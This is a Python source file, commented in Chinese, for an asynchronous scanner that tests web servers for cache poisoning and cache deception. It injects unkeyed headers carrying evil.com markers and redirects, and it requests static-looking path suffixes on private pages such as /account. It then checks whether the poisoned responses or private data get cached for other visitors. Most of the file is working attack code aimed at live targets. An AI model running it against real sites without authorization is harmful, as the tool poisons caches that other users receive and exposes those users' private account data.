#!/usr/bin/env python3
"""
Cache Poisoning — Web 缓存投毒 + 缓存欺骗模块

2024-2025 高价值漏洞类型，很多安全测试人员不测这个。

攻击类型：
1. Web Cache Poisoning（缓存投毒）
   - 通过 unkeyed headers/params 注入恶意内容到缓存
   - 下一个用户访问时被投毒的缓存内容命中
2. Web Cache Deception（缓存欺骗）
   - 诱导缓存服务器缓存受害者的私密页面
   - 攻击者访问缓存的 URL 获取受害者数据

测试方法：
- Unkeyed Header 探测（X-Forwarded-Host/X-Forwarded-Scheme 等）
- 路径规范化差异（/account.css → 缓存 /account 页面）
- 参数污染（加无用参数看是否影响缓存 key）
- Fat GET（GET 请求带 body）
- 响应头分析（Age/X-Cache/CF-Cache-Status）

用法：
    from cache_poisoning import CachePoisonScanner

    scanner = CachePoisonScanner()
    results = await scanner.scan("https://target.com")
"""

import asyncio
import random
import string
import time
import hashlib
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse, urljoin


# ═══════════════════════════════════════════════════════════════
# 缓存探测 Header（Unkeyed inputs）
# ═══════════════════════════════════════════════════════════════

# 这些 Header 通常不是缓存 key 的一部分，但可能影响响应内容
UNKEYED_HEADERS = [
    # 最常见的投毒向量
    {"X-Forwarded-Host": "POISON_MARKER", "_name": "x_forwarded_host"},
    {"X-Forwarded-Scheme": "http", "_name": "x_forwarded_scheme"},
    {"X-Forwarded-Proto": "http", "_name": "x_forwarded_proto"},
    {"X-Forwarded-Port": "1234", "_name": "x_forwarded_port"},
    {"X-Original-URL": "/poison", "_name": "x_original_url"},
    {"X-Rewrite-URL": "/poison", "_name": "x_rewrite_url"},
    {"X-Host": "POISON_MARKER", "_name": "x_host"},
    # 次要向量
    {"X-Forwarded-Server": "POISON_MARKER", "_name": "x_forwarded_server"},
    {"X-HTTP-Method-Override": "POST", "_name": "method_override"},
    {"X-Forwarded-Prefix": "/poison", "_name": "x_forwarded_prefix"},
    {"X-Amz-Website-Redirect-Location": "https://evil.com", "_name": "aws_redirect"},
    {"Fastly-SSL": "", "_name": "fastly_ssl"},
    {"CF-Connecting-IP": "1.2.3.4", "_name": "cf_connecting_ip"},
    {"True-Client-IP": "1.2.3.4", "_name": "true_client_ip"},
    {"Transfer-Encoding": "chunked", "_name": "transfer_encoding"},
    {"X-Wap-Profile": "http://evil.com/wap.xml", "_name": "wap_profile"},
]

# 缓存状态 Header 关键词
CACHE_INDICATORS = {
    "hit": ["HIT", "hit", "TCP_HIT"],
    "miss": ["MISS", "miss", "TCP_MISS"],
    "headers": ["X-Cache", "X-Cache-Status", "CF-Cache-Status",
                "X-Varnish", "X-Drupal-Cache", "X-Proxy-Cache",
                "Age", "X-Cache-Hits", "Fastly-Debug-Digest",
                "X-Served-By", "X-Timer", "Akamai-Cache-Status"],
}

# 缓存欺骗路径后缀（让中间件认为是静态文件从而缓存）
DECEPTION_SUFFIXES = [
    ".css", ".js", ".jpg", ".png", ".gif", ".ico",
    ".svg", ".woff", ".woff2", ".ttf",
    "/nonexistent.css", "/test.js", "/a.png",
    "%0a.css", "%23.css", "%3f.css",
    ";.css", "/.css",
]

# 路径规范化差异测试
PATH_NORMALIZATION = [
    # path confusion: /account → 动态, /account.css → 被缓存
    "{path}.css",
    "{path}.js",
    "{path}/..%2f{last_segment}.css",
    "{path}%2f.css",
    "{path}%23.css",
    "{path}%3f.css",
    "{path};.css",
    "{path}/.css",
    "{path}%00.css",
]


@dataclass
class CacheFinding:
    """缓存漏洞发现"""
    vuln_type: str = ""        # poisoning / deception
    technique: str = ""
    url: str = ""
    severity: str = "high"
    # 详情
    unkeyed_input: str = ""    # 哪个 header/param 是 unkeyed 的
    poison_value: str = ""     # 注入的值
    reflected_in: str = ""     # 在响应中哪里反射
    cache_header: str = ""     # 缓存状态 header
    # 验证
    confirmed: bool = False
    evidence: str = ""
    impact: str = ""
    timestamp: str = ""


class CachePoisonScanner:
    """Web 缓存投毒 + 缓存欺骗扫描器"""

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.concurrent = self.config.get("concurrent", 3)  # 缓存测试不能太快
        self.findings: List[CacheFinding] = []
        self._cache_buster = 0

    async def scan(self, target_url: str, paths: List[str] = None) -> List[CacheFinding]:
        """
        完整缓存安全扫描

        Args:
            target_url: 目标 URL
            paths: 额外要测试的路径列表
        """
        self.findings = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        print(f"[*] Cache Poisoning Scan: {target_url}")

        # Phase 1: 确认目标是否有缓存
        has_cache, cache_info = await self._detect_cache(target_url)
        if has_cache:
            print(f"  [+] Cache detected: {cache_info}")
        else:
            print(f"  [*] No obvious cache detected, testing anyway...")

        # Phase 2: Web Cache Poisoning（缓存投毒）
        await self._scan_poisoning(target_url)

        # Phase 3: Web Cache Deception（缓存欺骗）
        test_paths = paths or ["/account", "/profile", "/settings",
                               "/user", "/dashboard", "/me", "/api/me"]
        await self._scan_deception(base_url, test_paths)

        # Phase 4: 参数缓存 key 测试
        await self._scan_param_keying(target_url)

        vuln_count = len(self.findings)
        print(f"\n[+] Cache scan complete: {vuln_count} findings")
        return self.findings

    # ═══════════════════════════════════════════════════════════════
    # Phase 1: 缓存检测
    # ═══════════════════════════════════════════════════════════════

    async def _detect_cache(self, url: str) -> Tuple[bool, str]:
        """检测目标是否使用缓存"""
        # 发两次相同请求，看第二次是否有 cache hit
        cb = self._get_cache_buster()
        test_url = f"{url}{'&' if '?' in url else '?'}cb={cb}"

        resp1 = await self._request(test_url, include_headers=True)
        await asyncio.sleep(1)
        resp2 = await self._request(test_url, include_headers=True)

        if not resp1 or not resp2:
            return False, ""

        # 检查缓存相关 header
        for header_name in CACHE_INDICATORS["headers"]:
            for resp in [resp1, resp2]:
                h_lower = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                if header_name.lower() in h_lower:
                    value = h_lower[header_name.lower()]
                    return True, f"{header_name}: {value}"

        # 检查 Age header（有 Age 说明有缓存）
        if "age" in {k.lower() for k in resp2.get("headers", {})}:
            return True, "Age header present"

        return False, ""

    # ═══════════════════════════════════════════════════════════════
    # Phase 2: 缓存投毒
    # ═══════════════════════════════════════════════════════════════

    async def _scan_poisoning(self, url: str):
        """测试缓存投毒"""
        print(f"\n  [*] Testing cache poisoning ({len(UNKEYED_HEADERS)} headers)...")

        semaphore = asyncio.Semaphore(self.concurrent)
        tasks = []
        for header_set in UNKEYED_HEADERS:
            tasks.append(self._test_poison_header(url, header_set, semaphore))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_poison_header(self, url: str, header_set: Dict,
                                   semaphore: asyncio.Semaphore):
        """测试单个 unkeyed header"""
        async with semaphore:
            name = header_set.get("_name", "unknown")
            headers = {k: v for k, v in header_set.items() if not k.startswith("_")}

            # 用唯一标记替换 POISON_MARKER
            marker = f"poison{random.randint(10000,99999)}.evil.com"
            for k in headers:
                if headers[k] == "POISON_MARKER":
                    headers[k] = marker

            # 带 cache buster 发送请求（确保是 MISS）
            cb = self._get_cache_buster()
            test_url = f"{url}{'&' if '?' in url else '?'}cachebust={cb}"

            resp = await self._request(test_url, extra_headers=headers, include_headers=True)
            if not resp:
                return

            body = resp.get("body", "")
            status = resp.get("status", 0)

            # 检查 marker 是否在响应中反射
            if marker in body:
                # 确认：不带 header 再请求一次，看缓存是否被投毒
                await asyncio.sleep(0.5)
                resp2 = await self._request(test_url, include_headers=True)
                if resp2 and marker in resp2.get("body", ""):
                    # 确认投毒成功！
                    self.findings.append(CacheFinding(
                        vuln_type="poisoning",
                        technique=name,
                        url=test_url,
                        severity="high",
                        unkeyed_input=list(headers.keys())[0],
                        poison_value=marker,
                        reflected_in="response body",
                        confirmed=True,
                        evidence=f"Marker '{marker}' persists in cached response without header",
                        impact="Cache poisoning: injected content served to all users",
                        timestamp=datetime.now().isoformat(),
                    ))
                    print(f"    [!!] POISONED: {name} → marker reflected in cached response!")
                else:
                    # 反射但未缓存 → 仍有价值（可能条件不对）
                    self.findings.append(CacheFinding(
                        vuln_type="poisoning",
                        technique=name,
                        url=test_url,
                        severity="medium",
                        unkeyed_input=list(headers.keys())[0],
                        poison_value=marker,
                        reflected_in="response body (not cached)",
                        confirmed=False,
                        evidence=f"Header {list(headers.keys())[0]} reflected but not cached",
                        impact="Potential cache poisoning (needs cache hit conditions)",
                        timestamp=datetime.now().isoformat(),
                    ))
                    print(f"    [!] REFLECTED: {name} → header value in response (not cached yet)")

    # ═══════════════════════════════════════════════════════════════
    # Phase 3: 缓存欺骗
    # ═══════════════════════════════════════════════════════════════

    async def _scan_deception(self, base_url: str, paths: List[str]):
        """测试缓存欺骗"""
        print(f"\n  [*] Testing cache deception ({len(paths)} paths × "
              f"{len(DECEPTION_SUFFIXES)} suffixes)...")

        semaphore = asyncio.Semaphore(self.concurrent)
        tasks = []
        for path in paths:
            for suffix in DECEPTION_SUFFIXES[:6]:  # 限制测试量
                tasks.append(self._test_deception(base_url, path, suffix, semaphore))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_deception(self, base_url: str, path: str, suffix: str,
                              semaphore: asyncio.Semaphore):
        """测试单个缓存欺骗路径"""
        async with semaphore:
            # 构造欺骗 URL
            deception_url = f"{base_url}{path}{suffix}"

            # 第一次请求（模拟受害者访问）
            resp1 = await self._request(deception_url, include_headers=True)
            if not resp1 or resp1.get("status") not in (200, 301, 302):
                return

            # 检查响应是否包含动态/私密内容特征
            body = resp1.get("body", "")
            has_private_content = any(kw in body.lower() for kw in [
                "email", "username", "password", "token", "session",
                "balance", "account", "profile", "设置", "个人信息",
                "api_key", "secret", "csrf",
            ])

            if not has_private_content:
                return

            # 等待缓存生效
            await asyncio.sleep(2)

            # 第二次请求（不带任何认证信息）— 模拟攻击者
            resp2 = await self._request(deception_url, include_headers=True, no_cookies=True)
            if not resp2:
                return

            # 检查是否从缓存中获得了相同的私密内容
            resp2_headers = {k.lower(): v for k, v in resp2.get("headers", {}).items()}
            is_cached = False
            cache_header = ""
            for h in CACHE_INDICATORS["headers"]:
                if h.lower() in resp2_headers:
                    val = resp2_headers[h.lower()]
                    if any(hit in val for hit in CACHE_INDICATORS["hit"]):
                        is_cached = True
                        cache_header = f"{h}: {val}"
                        break

            if is_cached and has_private_content:
                self.findings.append(CacheFinding(
                    vuln_type="deception",
                    technique=f"path_suffix_{suffix}",
                    url=deception_url,
                    severity="high",
                    unkeyed_input=f"path suffix: {suffix}",
                    cache_header=cache_header,
                    confirmed=True,
                    evidence=f"Private content cached at {deception_url}",
                    impact="Cache deception: attacker can steal cached private data",
                    timestamp=datetime.now().isoformat(),
                ))
                print(f"    [!!] DECEPTION: {path}{suffix} → private content cached!")

    # ═══════════════════════════════════════════════════════════════
    # Phase 4: 参数 Key 测试
    # ═══════════════════════════════════════════════════════════════

    async def _scan_param_keying(self, url: str):
        """测试哪些参数不是缓存 key 的一部分"""
        print(f"\n  [*] Testing parameter keying...")

        # 加随机参数，看是否命中相同缓存
        test_params = ["utm_source", "utm_medium", "utm_campaign",
                       "fbclid", "gclid", "_", "cb", "nocache",
                       "x", "test", "debug"]

        base_resp = await self._request(url, include_headers=True)
        if not base_resp:
            return
        base_body = base_resp.get("body", "")[:500]

        for param in test_params:
            test_url = f"{url}{'&' if '?' in url else '?'}{param}=poison{random.randint(1000,9999)}"
            resp = await self._request(test_url, include_headers=True)
            if not resp:
                continue

            # 如果加了参数后响应完全相同 → 该参数不影响缓存 key
            if resp.get("body", "")[:500] == base_body:
                resp_headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
                for h in CACHE_INDICATORS["headers"]:
                    if h.lower() in resp_headers and any(
                        hit in resp_headers[h.lower()] for hit in CACHE_INDICATORS["hit"]
                    ):
                        # 参数不影响缓存 key → 可用于投毒
                        print(f"    [*] Unkeyed param: {param} (doesn't affect cache key)")
                        break

    # ═══════════════════════════════════════════════════════════════
    # HTTP 请求
    # ═══════════════════════════════════════════════════════════════

    async def _request(self, url: str, extra_headers: Dict = None,
                       include_headers: bool = False,
                       no_cookies: bool = False) -> Optional[Dict]:
        """发送请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout)]

        if include_headers:
            cmd.extend(["-D", "-"])  # 包含响应头
        else:
            cmd.extend(["-o", "-", "-w", "\n%{http_code}"])

        # 基本头
        cmd.extend(["-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"])
        cmd.extend(["-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.8"])

        if extra_headers:
            for k, v in extra_headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 5)
            output = stdout.decode(errors="ignore")

            if include_headers:
                # 解析响应头和 body
                parts = output.split("\r\n\r\n", 1)
                header_section = parts[0] if parts else ""
                body = parts[1] if len(parts) > 1 else ""

                # 提取状态码
                import re
                status_match = re.search(r"HTTP/[\d.]+ (\d+)", header_section)
                status = int(status_match.group(1)) if status_match else 0

                # 提取 headers
                headers = {}
                for line in header_section.splitlines()[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip()] = v.strip()

                return {"status": status, "headers": headers, "body": body}
            else:
                lines = output.rsplit("\n", 1)
                body = lines[0] if len(lines) > 1 else output
                status = int(lines[-1].strip()) if len(lines) > 1 and lines[-1].strip().isdigit() else 0
                return {"status": status, "body": body, "headers": {}}

        except Exception:
            return None

    def _get_cache_buster(self) -> str:
        """生成唯一 cache buster"""
        self._cache_buster += 1
        return f"{int(time.time())}{self._cache_buster}"

    def generate_report(self) -> str:
        """生成报告"""
        if not self.findings:
            return "No cache vulnerabilities found."

        lines = [
            "=" * 60,
            "  WEB CACHE VULNERABILITY REPORT",
            "=" * 60,
        ]

        poisoning = [f for f in self.findings if f.vuln_type == "poisoning"]
        deception = [f for f in self.findings if f.vuln_type == "deception"]

        if poisoning:
            lines.append(f"\n  [CACHE POISONING] {len(poisoning)} findings:")
            for f in poisoning:
                confirmed = "CONFIRMED" if f.confirmed else "POTENTIAL"
                lines.append(f"    [{f.severity.upper()}] [{confirmed}] {f.technique}")
                lines.append(f"      Header: {f.unkeyed_input}")
                lines.append(f"      URL: {f.url[:70]}")
                lines.append(f"      Impact: {f.impact}")
                lines.append("")

        if deception:
            lines.append(f"\n  [CACHE DECEPTION] {len(deception)} findings:")
            for f in deception:
                lines.append(f"    [{f.severity.upper()}] {f.technique}")
                lines.append(f"      URL: {f.url[:70]}")
                lines.append(f"      Cache: {f.cache_header}")
                lines.append(f"      Impact: {f.impact}")
                lines.append("")

        return "\n".join(lines)
